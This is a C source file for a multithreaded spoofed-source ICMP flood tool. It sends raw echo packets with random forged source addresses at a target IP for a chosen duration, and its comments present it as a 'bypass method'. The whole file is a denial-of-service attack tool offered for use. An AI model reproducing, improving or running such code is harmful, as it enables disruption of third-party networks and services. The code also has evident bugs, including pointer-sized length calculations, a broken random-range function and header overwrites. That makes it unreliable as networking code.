#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <linux/icmp.h>

#define MIN_PSIZE 128
#define MAX_PSIZE 768

#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

//spoofed icmp bypass method written in c by juan aka george glaskin

const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

typedef struct atk_args {
    in_addr_t host;

    int port, seconds, psize;
} args_t;

char characters[] = "abcdefghijklmnopqrstuvwxyz1234567890"; //characters used in random strings change if you want, size doesnt matter

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof (alphaset));
            len--;
        }
    }
}

static int random_int(int nMin, int nMax) {
    return rand_next() & ((nMax + 1) - nMin) + nMin;
}

static void atk_watch(int seconds) { //higher pps
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

static in_addr_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;


    tmp = rand_next();

    o1 = tmp & 0xff;
    o2 = (tmp >> 8) & 0xff;
    o3 = (tmp >> 16) & 0xff;
    o4 = (tmp >> 24) & 0xff;
    
    return INET_ADDR(o1,o2,o3,o4);
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

static void remake_packet(struct iphdr *iph, struct icmphdr *icmph) {
    int len = random_int(MIN_PSIZE, MAX_PSIZE);
    char buf[len];
    
    rand_alphastr((uint8_t *)buf, len);

    icmph->un.echo.sequence++;

    iph->saddr = get_random_ip();
    iph->tot_len = sizeof(iph) + sizeof(icmph) + 768;

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);

    memcpy((void *)icmph, buf, len);
}

static void *atk_icmphex(void *arg) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    args_t *args = (args_t *)arg;

    char rdbuf[768];

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct icmphdr *icmph = (struct icmphdr *)(rdbuf + sizeof(iph));

    struct sockaddr_in addr = {
        .sin_addr.s_addr = args->host,
        .sin_port = htons(args->port),
        .sin_family = AF_INET
    };

    iph->daddr = addr.sin_addr.s_addr;

    iph->ttl = 128;
    iph->version = 4;
    iph->protocol = IPPROTO_ICMP;
    iph->ihl = 5;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->id = htonl(54321);
    iph->tot_len = sizeof(iph) + sizeof(icmph) + 768;

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);


    icmph->un.echo.sequence = 0;
    icmph->un.echo.id = rand();
    icmph->type = ICMP_ECHO;
    icmph->code = 0;

    icmph->checksum = 0;
    icmph->checksum = checksum_generic((uint16_t *) (rdbuf + sizeof(struct iphdr)), sizeof(struct icmphdr));

    atk_watch(args->seconds);

    while(1) {
        remake_packet(iph, icmph);

        sendto(sock, rdbuf, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(addr));
    }
}

int main(int argc, char **argv) {
    if(argc != 5) {
        printf("Usage: invalid args!\r\n%s [ip] [port] [time] [threads]\r\nExample: %s 1.1.1.1 80 20 16\r\n", argv[0], argv[0]);

        return -1;
    }

    in_addr_t host;
    int port, seconds, threads;

    if(!(host = inet_addr(argv[1]))) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }
    else if((port = atoi(argv[2])) > 65535 || port < 1) {
        printf("[main] %s is invalid\r\n", argv[2]);

        return -1;
    }
    else if((seconds = atoi(argv[3])) < 1) {
        printf("[main] %s is invalid\r\n", argv[3]);

        return -1;
    }
    else if((threads = atoi(argv[4])) < 1) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }

    rand_init();

    puts("[main] initiated strings");

    if(threads < 200)
        puts("[warning] threads are high");

    args_t args = {
        .host = host,
        .port = port,
        .seconds = seconds
    };

    pthread_t thread[threads];
    
    for(int i = 0; i < threads; i++)
        pthread_create(&thread[i], NULL, atk_icmphex, (void *)&args);
    
    printf("[main] started: %d threads\n", threads);

    sleep(args.seconds);
}
